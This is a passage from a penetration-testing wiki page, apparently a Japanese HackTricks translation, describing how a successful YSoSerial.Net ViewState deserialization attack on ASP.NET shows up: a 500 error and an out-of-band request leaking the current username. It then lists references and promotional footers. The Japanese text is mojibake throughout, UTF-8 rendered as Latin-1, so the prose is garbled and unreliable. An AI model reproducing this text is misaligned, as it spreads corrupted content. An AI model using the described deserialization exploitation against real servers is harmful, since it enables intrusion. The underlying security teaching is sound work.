### æˆåŠŸã—ãŸæ”»æ’ƒã®çµæœ <a href="#poc" id="poc"></a>

ã™ã¹ã¦ã®ãƒ†ã‚¹ãƒˆã‚±ãƒ¼ã‚¹ã«ãŠã„ã¦ã€ViewStateã®YSoSerial.Netãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒ**æˆåŠŸ**ã—ãŸå ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã¯ã€Œ**500 Internal server error**ã€ã¨ã„ã†å¿œç­”ã‚’è¿”ã—ã€å¿œç­”ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«ã€Œ**The state information is invalid for this page and might be corrupted**ã€ã¨è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚ã¾ãŸã€ä»¥ä¸‹ã®å›³ã«ç¤ºã™ã‚ˆã†ã«ã€OOBãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å–å¾—ã—ã¾ã™ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/5.0POC-of-Seccuessful-exploitation.png)

ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’å«ã‚€ã‚¢ã‚¦ãƒˆã‚ªãƒ–ãƒãƒ³ãƒ‰ãƒªã‚¯ã‚¨ã‚¹ãƒˆ

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/5.1POC-of-Seccuessful-exploitation.png)

## å‚è€ƒæ–‡çŒ®

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" data-size="original">

ã‚‚ã—ã‚ãªãŸãŒ**ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚­ãƒ£ãƒªã‚¢**ã«èˆˆå‘³ãŒã‚ã‚Šã€è§£èª­ä¸èƒ½ãªã‚‚ã®ã‚’è§£èª­ã™ã‚‹ã“ã¨ã«èˆˆå‘³ãŒã‚ã‚‹ãªã‚‰ã€**æ¡ç”¨ã—ã¦ã„ã¾ã™**ï¼ˆæµæš¢ãªãƒãƒ¼ãƒ©ãƒ³ãƒ‰èªã®èª­ã¿æ›¸ããŒå¿…è¦ã§ã™ï¼‰ã€‚

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ã‚ãªãŸã¯**ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ HackTricksã§ã‚ãªãŸã®**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã‚Šã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[NFT](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
